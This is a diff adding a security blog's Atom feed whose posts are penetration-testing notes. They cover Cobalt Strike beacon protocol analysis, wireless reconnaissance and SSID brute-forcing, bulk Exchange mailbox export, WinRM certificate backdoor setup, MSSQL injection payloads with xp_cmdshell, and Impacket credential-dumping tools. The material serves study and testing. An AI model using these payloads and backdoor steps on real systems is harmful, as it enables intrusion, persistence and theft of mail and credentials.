@@ -1,0 +1,722 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://cx-reboot.github.io</id>
+    <title>CXAQHQ</title>
+    <updated>2024-11-08T15:01:56.534Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://cx-reboot.github.io"/>
+    <link rel="self" href="https://cx-reboot.github.io/atom.xml"/>
+    <subtitle>再努力一点！</subtitle>
+    <logo>https://cx-reboot.github.io/images/avatar.png</logo>
+    <icon>https://cx-reboot.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, CXAQHQ</rights>
+    <entry>
+        <title type="html"><![CDATA[Cobalt Strike 通讯协议分析]]></title>
+        <id>https://cx-reboot.github.io/post/cobalt-strike-通讯协议分析/</id>
+        <link href="https://cx-reboot.github.io/post/cobalt-strike-通讯协议分析/">
+        </link>
+        <updated>2024-04-20T01:50:26.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="元数据上报">元数据上报</h2>
+<p><em><strong>数据包格式</strong></em></p>
+<pre><code>+-----------------+-----------------+-----------------+-----------------+-------------------+-----------------+
+|  固定开头 (4B)  |   数据长度 (4B) | AES密钥 (16B)  |  编码1 (2B)     |  编码2 (2B)       |  会话ID (4B)    |
++-----------------+-----------------+-----------------+-----------------+-------------------+-----------------+
+|   magic number   |   数据实际长度  |   AES密钥部分   |  编码类型 1     |  编码类型 2       |  beacon session ID|
++-----------------+-----------------+-----------------+-----------------+-------------------+-----------------+
+|   PID (4B)      |   SSH端口 (2B)  |  系统和程序标识 |  Windows NT版本 |  Windows Build号   |  未知作用 (4B)  |
++-----------------+-----------------+-----------------+-----------------+-------------------+-----------------+
+|  ptr_gmh (4B)   |  ptr_gpa (4B)   | 内网IP地址 (4B) | 计算机信息      |                   |                 |
++-----------------+-----------------+-----------------+-----------------+-------------------+-----------------+
+</code></pre>
+<p><em><strong>数据包格式文字解答</strong></em></p>
+<blockquote>
+<p>引用：https://xz.aliyun.com/t/12546?time__1311=GqGxuiD%3DiQLxlrzd0%3DAmODmh4fEq7TymD&amp;u_atoken=5e0d1b0f22c6cd147d8471acc50da034&amp;u_asig=1a0c39d517305973725098259e003e#toc-8</p>
+</blockquote>
+<pre><code>4byte：元数据的固定开头magic number 48897
+4byte：数据长度
+16byte：把这16位进行sha256加密，得出的32位二进制结果的前16位就是通信的aes密钥，后16位就是hmac hash
+2byte：大端字节序表示的编码，具体对应关系在WindowsCharsets.getName
+2byte：大端字节序表示的编码，具体对应关系在WindowsCharsets.getName
+4byte：beacon session id，用来标识每个会话
+4byte：pid
+2byte：ssh port
+1byte：用来判断系统和程序位数，和是否system权限，初始值为0，如果是64位系统就+4，如果是64位程序就+2，如果是system权限就+8，报错获取不到就+1，这里用按位与的方法来累加判断，用非常少的代码就表实现了这个判断，很巧妙。
+2byte：windows nt 版本
+2byte：window 系统build 号
+4byte：未知作用
+4byte：ptr_gmh
+4byte：ptr_gpa
+4byte：大端字节序表示的内网ip地址
+
+计算机信息：从输入的metadata 的第59位开始截取到末尾，截取的数据就是计算机名\n用户名\n程序名
+</code></pre>
+<p>元数据及对应解析结果</p>
+<pre><code>+++++++++++++++元数据格式解析+++++++++++++++
+原始数据:  [0 0 190 239 0 0 0 98 1 162 254 43 204 151 152 151 148 205 223 57 183 86 194 164 233 253 233 253 0 13 178 162 0 0 26 14 0 0 2 15 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 76 50 168 192 77 97 99 66 111 111 107 45 80 114 111 45 45 45 99 120 97 113 104 113 46 108 111 99 97 108 32 40 68 97 114 119 105 110 41 9 99 120 97 113 104 113 9 109 97 105 110]
+魔数: 48879
+数据长度: 98
+AES 密钥: 8d7b19390812af8d9ae8c09eabaacb92
+HMAC: 26a61f715dffae444b6400d31c2743ec
+编码 1: 59901, 编码 2: 59901
+会话 ID: 897698
+进程 ID: 6670
+SSH 端口: 0
+操作系统状态: 2
+Windows NT 版本: 3840, Build: 0
+未知字段 1: 0
+指针 GMH: 0, GPA: 0
+内网 IP 地址: 192.168.50.76
+计算机信息（原始字节数据转换为字符串）: MacBook-Pro---cxaqhq.local (Darwin)	cxaqhq	main
+计算机信息，原始字节数据:
+ [77 97 99 66 111 111 107 45 80 114 111 45 45 45 99 120 97 113 104 113 46 108 111 99 97 108 32 40 68 97 114 119 105 110 41 9 99 120 97 113 104 113 9 109 97 105 110]
+信息: MacBook-Pro---cxaqhq.local (Darwin)	cxaqhq	main
++++++++++++++++元数据格式解析+++++++++++++++
+</code></pre>
+<h2 id="teamserver-下发任务">TeamServer 下发任务</h2>
+<p><em><strong>数据格式</strong></em></p>
+<pre><code>+-----------------+-----------------+-----------------+-----------------+-------------------+
+|    时间戳 (4B)  |   任务数据长度 (4B) |  命令类型 (4B)   | cmdbuf长度 (4B) |   cmd buf (N)     |
++-----------------+-----------------+-----------------+-----------------+-------------------+
+
+</code></pre>
+<p><em><strong>数据格式文字说明</strong></em></p>
+<blockquote>
+<p>引用：https://xz.aliyun.com/t/12546?time__1311=GqGxuiD%3DiQLxlrzd0%3DAmODmh4fEq7TymD&amp;u_atoken=5e0d1b0f22c6cd147d8471acc50da034&amp;u_asig=1a0c39d517305973725098259e003e#toc-8</p>
+</blockquote>
+<pre><code>4byte 时间戳
+4byte 任务数据长度
+任务数据
+    4byte 命令类型
+    4byte cmdbuf长度
+    cmd buf
+</code></pre>
+<h3 id="pwd-任务下发">pwd 任务下发</h3>
+<p>解析结果，cmdType: 39 为pwd 命令，具体cmdType 可见文末部分。</p>
+<pre><code>+++++++++++++++任务数据格式解析+++++++++++++++
+原始返回数据:  [53 186 77 13 96 199 175 8 208 35 189 31 249 27 85 158 2 5 23 238 25 84 50 40 154 21 248 0 174 132 82 150 114 73 122 46 67 99 54 37 11 156 141 177 103 225 102 69]
+AES解密数据:  [103 39 14 19 0 0 0 8 0 0 0 39 0 0 0 0 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65 65]
+前四字节:  [103 39 14 19]
+4-8字节 长度:  [0 0 0 8]
+时间戳: 1730612755
+任务数据长度: 8
+命令类型: 39
+cmdbuf 长度: 0
+cmd buf: 
+cmdType: 39
+cmdBufferString: 
+cmdBuffer: []
+返回任务执行结果
+callbackType:  19
+执行结果:  [47 85 115 101 114 115 47 99 120 97 113 104 113 47 116 111 111 108 115 47 67 50 47 103 101 97 99 111 110 95 112 114 111 95 116 101 115 116]
+执行结果字符串: /Users/cxaqhq/tools/C2/geacon_pro_test
++++++++++++++++任务数据格式解析+++++++++++++++
+</code></pre>
+<h3 id="命令行ps和页面ps命令区别">命令行PS和页面PS命令区别</h3>
+<p>命令行PS 下发的任务数据</p>
+<pre><code>前四字节:  [103 38 250 90]
+4-8字节 长度:  [0 0 0 12]
+时间戳: 1730607706
+任务数据长度: 12
+命令类型: 32
+cmdbuf 长度: 4
+cmd buf: 00000000
+cmdType: 32
+cmdBufferString: 
+cmdBuffer: [0 0 0 0]
+</code></pre>
+<p>页面PS 下发的任务数据</p>
+<pre><code>前四字节:  [103 38 250 113]
+4-8字节 长度:  [0 0 0 12]
+时间戳: 1730607729
+任务数据长度: 12
+命令类型: 32
+cmdbuf 长度: 4
+cmd buf: 00000001
+cmdType: 32
+cmdBufferString: 
+cmdBuffer: [0 0 0 1]
+</code></pre>
+<p>区别就在于cmdbuf 内容是否存在</p>
+<h2 id="beacon-结果回传">Beacon 结果回传</h2>
+<p><em><strong>数据包格式</strong></em></p>
+<pre><code>+-----------------+-------------------+-----------------+-------------------+-----------------+---------------------+
+|    数据长度 (4B)  |    AES 加密数据 (N)   |  CS 防重放整数 (4B) |   数据长度 (4B)   |  任务类型 (4B)   |  任务结果数据 (M)  |
+|                 |                   |                 |                   |                 |                     |
+|                 |                   |                 |                   |                 |                     |
++-----------------+-------------------+-----------------+-------------------+-----------------+---------------------+
+|                       其他数据 (X)                                    |
++-----------------------------------------------------------------------+
+|                               HMAC (16B)                             |
++-----------------------------------------------------------------------+
+</code></pre>
+<p><em><strong>数据包格式文字说明</strong></em></p>
+<blockquote>
+<p>引用：https://xz.aliyun.com/t/12546?time__1311=GqGxuiD%3DiQLxlrzd0%3DAmODmh4fEq7TymD&amp;u_atoken=5e0d1b0f22c6cd147d8471acc50da034&amp;u_asig=1a0c39d517305973725098259e003e#toc-8</p>
+</blockquote>
+<pre><code>4byte：数据长度
+    aes 加密数据
+        4byte：cs 防重放int
+        4byte：数据长度
+            4byte：数据对应任务类型
+            任务结果数据
+            其他数据
+    16byte：hmac hash签名
+</code></pre>
+<p>任务类型（Callback）: 19，具体Callback可见文末部分。</p>
+<pre><code>+++++++++++++++上报数据格式解析+++++++++++++++
+加密后原始数据:  [0 0 0 80 76 249 176 87 29 175 60 99 241 216 76 224 237 233 157 78 87 1 133 248 49 69 23 163 44 209 63 97 143 65 255 166 240 222 185 170 6 6 62 224 67 143 214 248 216 113 100 195 198 230 250 9 74 121 55 65 219 143 124 205 105 92 120 235 140 155 97 71 135 170 129 187 141 184 215 6 135 3 97 241]
+加密后原始数据 (hex): 000000504cf9b0571daf3c63f1d84ce0ede99d4e570185f8314517a32cd13f618f41ffa6f0deb9aa06063ee0438fd6f8d87164c3c6e6fa094a793741db8f7ccd695c78eb8c9b614787aa81bb8db8d706870361f1
+数据长度: 80
+AES 长度: 64
+AES 数据: 4cf9b0571daf3c63f1d84ce0ede99d4e570185f8314517a32cd13f618f41ffa6f0deb9aa06063ee0438fd6f8d87164c3c6e6fa094a793741db8f7ccd695c78eb
+AES 数据:  [76 249 176 87 29 175 60 99 241 216 76 224 237 233 157 78 87 1 133 248 49 69 23 163 44 209 63 97 143 65 255 166 240 222 185 170 6 6 62 224 67 143 214 248 216 113 100 195 198 230 250 9 74 121 55 65 219 143 124 205 105 92 120 235]
+KEY : 0bdd5db92d8dbe82e8b98d7c754af58d
+IV : 6162636465666768696a6b6c6d6e6f70
+解密结果: */Users/cxaqhq/tools/C2/geacon_pro_testAAAAAAAAAAAAAA
+解密数据长度: 64
+CS 防重放整数: 1
+数据长度: 42
+任务类型: 19
+任务结果数据: /Users/cxaqhq/tools/C2/geacon_pro_testAAAA
+其他数据: 41414141414141414141
+HMAC hash 签名: 8c9b614787aa81bb8db8d706870361f1
++++++++++++++++上报数据格式解析+++++++++++++++
+</code></pre>
+<h2 id="aes解密">AES解密</h2>
+<pre><code>AES 数据 (hex): c1523d7fb9925c88dd6515a8c8967468ad9a9b063c7bcff92a9882a776c4802ab0da181dafad1e503d6536fecb65873e5cd1731243baca9bf45f091d79262a00
+AES KEY (hex): 9d2154fb874d9929b01c170be95a5a42
+AES IV (hex): 6162636465666768696a6b6c6d6e6f70
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://cx-reboot.github.io/post-images/1730621618509.png" alt="" loading="lazy"></figure>
+<h2 id="cmd_type">CMD_TYPE</h2>
+<p>常见cmdType。</p>
+<pre><code>	CMD_TYPE_SLEEP                      = 4
+	CMD_TYPE_PAUSE                      = 47
+	CMD_TYPE_SHELL                      = 78
+	CMD_TYPE_UPLOAD_START               = 10
+	CMD_TYPE_UPLOAD_LOOP                = 67
+	CMD_TYPE_DOWNLOAD                   = 11
+	CMD_TYPE_EXIT                       = 3
+	CMD_TYPE_CD                         = 5
+	CMD_TYPE_PWD                        = 39
+	CMD_TYPE_FILE_BROWSE                = 53
+	CMD_TYPE_SPAWN_X64                  = 44
+	CMD_TYPE_SPAWN_X86                  = 1
+	CMD_TYPE_EXECUTE                    = 12
+	CMD_TYPE_GETUID                     = 27
+	CMD_TYPE_GET_PRIVS                  = 77
+	CMD_TYPE_STEAL_TOKEN                = 31
+	CMD_TYPE_PS                         = 32
+	CMD_TYPE_KILL                       = 33
+	CMD_TYPE_DRIVES                     = 55
+	CMD_TYPE_RUNAS                      = 38
+	CMD_TYPE_MKDIR                      = 54
+	CMD_TYPE_RM                         = 56
+	CMD_TYPE_CP                         = 73
+	CMD_TYPE_MV                         = 74
+	CMD_TYPE_REV2SELF                   = 28
+	CMD_TYPE_MAKE_TOKEN                 = 49
+	CMD_TYPE_PIPE                       = 40
+	CMD_TYPE_PORTSCAN_X86               = 89
+	CMD_TYPE_PORTSCAN_X64               = 90
+	CMD_TYPE_KEYLOGGER                  = 101
+	CMD_TYPE_EXECUTE_ASSEMBLY_X64       = 88
+	CMD_TYPE_EXECUTE_ASSEMBLY_X86       = 87
+	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64 = 71
+	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86 = 70
+	CMD_TYPE_IMPORT_POWERSHELL          = 37
+	CMD_TYPE_POWERSHELL_PORT            = 79
+	CMD_TYPE_INJECT_X64                 = 43
+	CMD_TYPE_INJECT_X86                 = 9
+	CMD_TYPE_BOF                        = 100
+	CMD_TYPE_RUNU                       = 76
+	CMD_TYPE_ARGUE_QUERY                = 85
+	CMD_TYPE_ARGUE_REMOVE               = 84
+	CMD_TYPE_ARGUE_ADD                  = 83
+</code></pre>
+<h2 id="callback">CALLBACK</h2>
+<p>常见Callback。</p>
+<pre><code>	CALLBACK_OUTPUT            = 0
+	CALLBACK_KEYSTROKES        = 1
+	CALLBACK_FILE              = 2
+	CALLBACK_SCREENSHOT        = 3
+	CALLBACK_CLOSE             = 4
+	CALLBACK_READ              = 5
+	CALLBACK_CONNECT           = 6
+	CALLBACK_PING              = 7
+	CALLBACK_FILE_WRITE        = 8
+	CALLBACK_FILE_CLOSE        = 9
+	CALLBACK_PIPE_OPEN         = 10
+	CALLBACK_PIPE_CLOSE        = 11
+	CALLBACK_PIPE_READ         = 12
+	CALLBACK_POST_ERROR        = 13
+	CALLBACK_PIPE_PING         = 14
+	CALLBACK_TOKEN_STOLEN      = 15
+	CALLBACK_TOKEN_GETUID      = 16
+	CALLBACK_PROCESS_LIST      = 17
+	CALLBACK_POST_REPLAY_ERROR = 18
+	CALLBACK_PWD               = 19
+	CALLBACK_JOBS              = 20
+	CALLBACK_HASHDUMP          = 21
+	CALLBACK_PENDING           = 22
+	CALLBACK_ACCEPT            = 23
+	CALLBACK_NETVIEW           = 24
+	CALLBACK_PORTSCAN          = 25
+	CALLBACK_DEAD              = 26
+	CALLBACK_SSH_STATUS        = 27
+	CALLBACK_CHUNK_ALLOCATE    = 28
+	CALLBACK_CHUNK_SEND        = 29
+	CALLBACK_OUTPUT_OEM        = 30
+	CALLBACK_ERROR             = 31
+	CALLBACK_OUTPUT_UTF8       = 32
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WiFiChallenge Lab V2.0]]></title>
+        <id>https://cx-reboot.github.io/post/wifichallenge-lab-v20/</id>
+        <link href="https://cx-reboot.github.io/post/wifichallenge-lab-v20/">
+        </link>
+        <updated>2023-11-18T06:30:56.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="第一关-recon侦查">第一关 Recon（侦查）</h2>
+<h3 id="11-查看特定-wifi-使用信道">1.1 查看特定 WIFi 使用信道</h3>
+<pre><code>开启网线网卡监听
+iwconfig
+airmon-ng start wlan0
+
+监听所以信道WiFi
+airodump-ng wlan0mon 
+
+指定信道监听
+airodump-ng wlan0mon  -c 11
+</code></pre>
+<h3 id="12-查看特定-wifi-客户端-mac">1.2 查看特定 WIFi 客户端 MAC</h3>
+<pre><code>指定信道监听
+airodump-ng wlan0mon  -c 11 
+
+
+指定BSSID监听
+airodump-ng wlan0mon  -c 11  --bssid xx:xx:xx:xx:xx:xx
+
+
+指定ESSID监听
+airodump-ng wlan0mon  -c 11  --ESSID xxxxxx
+</code></pre>
+<h3 id="13-查看特定-wifi-客户端-mac">1.3 查看特定 WIFi 客户端 MAC</h3>
+<pre><code>指定信道监听
+airodump-ng wlan0mon  -c 11 
+
+
+指定BSSID监听
+airodump-ng wlan0mon  -c 11  --bssid xx:xx:xx:xx:xx:xx
+
+
+指定ESSID监听
+airodump-ng wlan0mon  -c 11  --ESSID xxxxxx
+</code></pre>
+<h3 id="14-查看隐藏ap-的essid-名称-无连接客户端">1.4 查看隐藏AP 的ESSID 名称 （无连接客户端）</h3>
+<p>对于没有客户端的隐藏AP来说，单纯使用airodump-ng 监听已经失效了，</p>
+<pre><code>mdk4 wlan0mon p -f pass.txt -t xx:xx:xx:xx:xx:xx
+
+命令参考
+攻击模式p：
+SSID探测和暴力攻击探测AP并检查答案，有助于检查SSID是否有已正确解密，如果AP在您的发送范围内。
+带或不带单词列表的隐藏SSID的野蛮强制执行也可用。
+
+-e &lt;ssid&gt;
+要探测的SSID
+
+-f &lt;文件名&gt;
+从文件中读取SSID，以暴力强制隐藏的SSID
+
+-t &lt;bssid&gt;
+设置目标AP的MAC地址
+
+-s &lt;pps&gt;
+设置速度（默认：400）
+
+-b &lt;字符集&gt;
+使用完整的暴力模式（仅建议用于短SSID！）
+您可以同时选择多个字符集：
+* n（数字：0-9）
+* u（大图：A-Z）
+* l（小写：a-z）
+* s（符号：ASCII）
+
+-p &lt;word&gt;
+继续暴力，从&lt;word&gt;开始。
+
+-r &lt;频道&gt;
+探针请求测试（mod-musket）
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Exchange 邮件导出]]></title>
+        <id>https://cx-reboot.github.io/post/exchange-dump-emali/</id>
+        <link href="https://cx-reboot.github.io/post/exchange-dump-emali/">
+        </link>
+        <updated>2023-10-16T01:59:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="常用命令">常用命令</h2>
+<h3 id="连接服务器">连接服务器</h3>
+<pre><code>Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+</code></pre>
+<h3 id="查看邮箱用户">查看邮箱用户</h3>
+<pre><code>Get-Mailbox
+</code></pre>
+<h3 id="获取所有邮箱名称">获取所有邮箱名称</h3>
+<pre><code>Get-Mailbox -ResultSize unlimited
+</code></pre>
+<h3 id="查看邮件导出请求">查看邮件导出请求</h3>
+<pre><code>Get-MailboxExportRequest
+</code></pre>
+<h2 id="导出全部邮件">导出全部邮件</h2>
+<pre><code>Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\test\&quot;+($_.name)+&quot;.pst&quot;)}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[IIS 端口复用及后门研究]]></title>
+        <id>https://cx-reboot.github.io/post/iis-duan-kou-fu-yong-ji-hou-men-yan-jiu/</id>
+        <link href="https://cx-reboot.github.io/post/iis-duan-kou-fu-yong-ji-hou-men-yan-jiu/">
+        </link>
+        <updated>2023-07-12T01:15:10.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<h2 id="端口复用">端口复用</h2>
+<h2 id="iis-端口复用">IIS 端口复用</h2>
+<h3 id="iis后门">IIS后门</h3>
+<h2 id="实战">实战</h2>
+<h3 id="winrm-证书认证">Winrm + 证书认证</h3>
+<pre><code>在命令提示符（cmd）中启用 WinRM 服务器上的证书身份验证，可以使用以下命令：
+
+winrm set winrm/config/service/auth @{Certificate=&quot;true&quot;}
+这个命令将启用 WinRM 服务器上的证书身份验证。启用证书身份验证后，WinRM 服务器将验证客户端证书以确保客户端的身份。如果客户端证书不受信任或无效，则连接将被拒绝。
+
+注意：运行此命令需要管理员权限。
+
+另外，如果你想禁用 WinRM 服务器上的证书身份验证，可以使用以下命令：
+
+winrm set winrm/config/service/auth @{Certificate=&quot;false&quot;}
+这个命令将禁用 WinRM 服务器上的证书身份验证。
+</code></pre>
+<p>为了配置 WinRM 证书认证设置后门，你需要进行以下步骤：</p>
+<ol>
+<li>在运行 WinRM 的服务器上，生成一个自签名证书。</li>
+</ol>
+<p>你可以使用 PowerShell cmdlet <code>New-SelfSignedCertificate</code> 来生成自签名证书。例如，以下命令将生成一个有效期为 10 年的自签名证书：</p>
+<pre><code>New-SelfSignedCertificate -Subject &quot;CN=MyServer&quot; -CertStoreLocation &quot;Cert:\LocalMachine\My&quot; -NotAfter (Get-Date).AddYears(10)
+</code></pre>
+<p>在运行 WinRM 的服务器上使用 cmd 生成自签名证书的方法如下：</p>
+<ol>
+<li>
+<p>打开命令提示符（cmd）。</p>
+</li>
+<li>
+<p>输入以下命令来生成自签名证书：</p>
+</li>
+</ol>
+<pre><code>makecert -r -pe -n &quot;CN=MyServer&quot; -b 01/01/2022 -e 01/01/2025 -sky exchange -ss My
+</code></pre>
+<p>其中，“CN=MyServer”是证书的主题名称，可以根据需要进行更改。此外，还可以更改证书的有效期和存储位置。</p>
+<ol start="3">
+<li>输入以下命令来查看新生成的证书：</li>
+</ol>
+<pre><code>certutil -store My
+</code></pre>
+<p>此命令将列出存储在“我的”证书存储区中的证书，包括刚刚生成的自签名证书。</p>
+<p>现在，您已经在运行 WinRM 的服务器上生成了一个自签名证书。请注意，自签名证书不受受信任的根证书颁发机构的信任，因此在生产环境中使用自签名证书时，请确保将其导入到受信任的根证书颁发机构存储中或由受信任的根证书颁发机构颁发的证书。</p>
+<ol start="2">
+<li>将证书导出为 PFX 文件。</li>
+</ol>
+<p>使用 PowerShell cmdlet <code>Export-PfxCertificate</code> 将证书导出为 PFX 文件。例如，以下命令将证书导出到 C:\MyCertificate.pfx 文件中：</p>
+<pre><code>Export-PfxCertificate -Cert &quot;Cert:\LocalMachine\My\&lt;Thumbprint&gt;&quot; -FilePath C:\MyCertificate.pfx -Password (ConvertTo-SecureString -String &quot;&lt;Password&gt;&quot; -Force –AsPlainText)
+</code></pre>
+<p>其中 <code>&lt;Thumbprint&gt;</code> 是证书的指纹，<code>&lt;Password&gt;</code> 是用于保护导出文件的密码。</p>
+<ol start="3">
+<li>在需要进行后门访问的客户端上，导入 PFX 文件。</li>
+</ol>
+<p>使用 PowerShell cmdlet <code>Import-PfxCertificate</code> 将 PFX 文件导入到客户端计算机的证书存储中。例如，以下命令将 C:\MyCertificate.pfx 文件导入到客户端计算机的个人证书存储中：</p>
+<pre><code>Import-PfxCertificate -FilePath C:\MyCertificate.pfx -CertStoreLocation &quot;Cert:\CurrentUser\My&quot; -Password (ConvertTo-SecureString -String &quot;&lt;Password&gt;&quot; -Force –AsPlainText)
+</code></pre>
+<ol start="4">
+<li>配置 WinRM 服务器以使用证书认证。</li>
+</ol>
+<p>使用 PowerShell cmdlet <code>Set-Item</code> 配置 WinRM 服务器以使用证书认证。例如，以下命令将 WinRM 服务器配置为使用证书认证：</p>
+<pre><code>Set-Item -Path WSMan:\localhost\Service\Auth\Certificate -Value $true
+</code></pre>
+<ol start="5">
+<li>在客户端上，配置 WinRM 以使用证书身份验证。</li>
+</ol>
+<p>使用 PowerShell cmdlet <code>Set-Item</code> 配置客户端上的 WinRM 以使用证书身份验证。例如，以下命令将客户端上的 WinRM 配置为使用证书身份验证：</p>
+<pre><code>Set-Item -Path WSMan:\localhost\Client\Auth\Certificate -Value $true
+</code></pre>
+<ol start="6">
+<li>使用 PowerShell 连接到 WinRM 服务器。</li>
+</ol>
+<p>使用 PowerShell cmdlet <code>Enter-PSSession</code> 或 <code>New-PSSession</code>，使用 <code>-CertificateThumbprint</code> 参数指定证书的指纹，连接到 WinRM 服务器。例如，以下命令将使用证书身份验证连接到 WinRM 服务器：</p>
+<pre><code>Enter-PSSession -ComputerName &lt;ServerName&gt; -Credential (Get-Credential) -CertificateThumbprint &lt;Thumbprint&gt;
+</code></pre>
+<p>其中 <code>&lt;ServerName&gt;</code> 是 WinRM 服务器的名称，<code>&lt;Thumbprint&gt;</code> 是证书的指纹。</p>
+<p>以上是配置 WinRM 证书认证设置后门的步骤。请注意，这种做法可能会导致安全风险，请谨慎使用。</p>
+<h3 id="参考">参考</h3>
+<ul>
+<li>https://paper.seebug.org/1004</li>
+<li>https://paper.seebug.org/1692/</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Naabu 端口扫描]]></title>
+        <id>https://cx-reboot.github.io/post/naabu-duan-kou-sao-miao/</id>
+        <link href="https://cx-reboot.github.io/post/naabu-duan-kou-sao-miao/">
+        </link>
+        <updated>2023-06-07T08:28:31.000Z</updated>
+        <content type="html"><![CDATA[<p>项目地址：https://github.com/projectdiscovery/naabu</p>
+<pre><code>./naabu -p 22 -host 192.168.1.1
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Windows SC命令（服务）]]></title>
+        <id>https://cx-reboot.github.io/post/windows-sc-ming-ling-fu-wu/</id>
+        <link href="https://cx-reboot.github.io/post/windows-sc-ming-ling-fu-wu/">
+        </link>
+        <updated>2023-05-23T08:45:56.000Z</updated>
+        <content type="html"><![CDATA[<p>[sc query]   查看所有服务的运行状态</p>
+<p>[sc query 服务名]   查看某个服务的运行状态。</p>
+<p>[sc qc 服务名]       查看某个服务的配置信息。</p>
+<p>[sc start 服务名]    启动服务。</p>
+<p>[sc stop 服务名]    停止服务。</p>
+<p>[sc delete 服务名]    删除服务。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[MSSQL 手工注入]]></title>
+        <id>https://cx-reboot.github.io/post/mssql-shou-gong-zhu-ru/</id>
+        <link href="https://cx-reboot.github.io/post/mssql-shou-gong-zhu-ru/">
+        </link>
+        <updated>2023-05-07T00:55:04.000Z</updated>
+        <content type="html"><![CDATA[<p>参考链接：</p>
+<ul>
+<li>https://xz.aliyun.com/t/7534</li>
+</ul>
+<p>时间盲注</p>
+<pre><code>admin' WAITFOR DELAY '0:0:5
+
+
+admin' IF(29=29) WAITFOR DELAY '0:0:5'-- 
+</code></pre>
+<h2 id="判断xp_cmdshell-状态">判断xp_cmdshell 状态</h2>
+<pre><code>select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+
+
+更简单方法
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
+</code></pre>
+<h2 id="执行命令">执行命令</h2>
+<pre><code>exec master..xp_cmdshell 'whoami'
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Impacket]]></title>
+        <id>https://cx-reboot.github.io/post/impacket/</id>
+        <link href="https://cx-reboot.github.io/post/impacket/">
+        </link>
+        <updated>2023-05-06T11:10:46.000Z</updated>
+        <content type="html"><![CDATA[<p>项目地址：https://github.com/fortra/impacket<br>
+二进制下载地址：https://github.com/ropnop/impacket_static_binaries</p>
+<p>参考文章：https://xz.aliyun.com/t/11877</p>
+<h2 id="impacket的脚本介绍">Impacket的脚本介绍</h2>
+<p>以下是本篇文章将会介绍使用方法的脚本一览：</p>
+<pre><code>远程执行	psexec.py	使用了RemComSvc的实现了PSEXEC功能的脚本。
+
+远程执行	smbexec.py	类似PSECEX的执行方式，但未使用RemComSvc。这个脚本使用了一个本地SMB Server接收返回的结果，可以避免目标SMB没有可写的目录
+
+远程执行	atexec.py	这个脚本通过MS-TSCH协议控制计划任务在目标机器上执行命令并获得回显
+
+远程执行	wmiexec.py	通过WMI实现了半交互式的Shell，不需要在目标安装任何服务或软件。而且高度隐蔽的以管理员权限运行
+
+远程执行	dcomexec.py	类似wmiexec.py的半交互式Shell，但是使用了DCOM接口，目前支持的接口有MMC20.Application、ShellWindows、ShellBrowserWindows
+
+Kerberos协议	GetTGT.py	提供密码、hash或aeskey用来请求TGT并且保存为ccache格式
+
+Kerberos协议	GetST.py	提供密码、hash、aeskey或ccache格式的TGT，可以请求服务票据并保存为ccache格式。如果提供的账户存在约束委派且支持协议转换，那么可以使用-impersonate选项模拟为其他用户请求票据
+
+Kerberos协议	GetPac.py	这个脚本会为指定用户请求经过身份验证的PAC，通过使用MS-SFU协议的S4USelf和U2U的Kerberos认证实现
+
+Kerberos协议	GetUserSPNs.py	这个脚本会找出和普通用户账户关联的SPN，输出格式与JtR和hashcat兼容
+
+Kerberos协议	GetNPUsers.py	这个脚本会尝试获得并列出不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户，输出和JtR兼容。
+
+Kerberos协议	rbcd.py	这个脚本可以处理目标机器的msDS-AllowedToActOnBehalfOfOtherIdentity属性
+
+Kerberos协议	ticketConverter.py	这个脚本可以在mimikatz常用的kirbi文件和Impacket常用的ccache文件之间进行转换
+
+Kerberos协议	ticketer.py	这个脚本可以基于模板或自己创建金、银票据，并允许你自定义PAC_LOGON_INFO、groups、ExtraSids、duration等属性
+
+Kerberos协议	raiseChild.py	这个脚本通过金票据和ExtraSids实现从子域到域森林的提权
+
+Windows密码	secretsdump.py	提供各种技术以不运行任何程序远程dump密码。对SAM和LSA以及缓存的凭据，会尝试从目标注册表中读取并将hives保存在%SYSTEMROOT%\Temp目录，再将hives读取回来。对于DIT文件，会使用DL_DRSGetNCChanges函数来dump目标的NTLM hash、明文密码和Kerberos keys。也可以通过smbexec或wmiexec执行vssadmin得到NTDS.dit，并对其进行解密。这个脚本在服务不可用的情况下会打开对应的服务，例如远程注册表。在执行结束后，会将激活的服务还原。
+
+Windows密码	mimikatz.py	一个用来控制远程mimikatz RPC服务器的Shell，由@gentikiwi开发。
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[IPC渗透]]></title>
+        <id>https://cx-reboot.github.io/post/ipc-shen-tou/</id>
+        <link href="https://cx-reboot.github.io/post/ipc-shen-tou/">
+        </link>
+        <updated>2023-05-06T10:56:52.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="自启动目录">自启动目录</h3>
+<pre><code>#系统自启动
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+
+#用户自启动
+c:\users\用户名\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup
+</code></pre>
+<h3 id="查看本机连接共享情况">查看本机连接共享情况</h3>
+<pre><code>net use
+</code></pre>
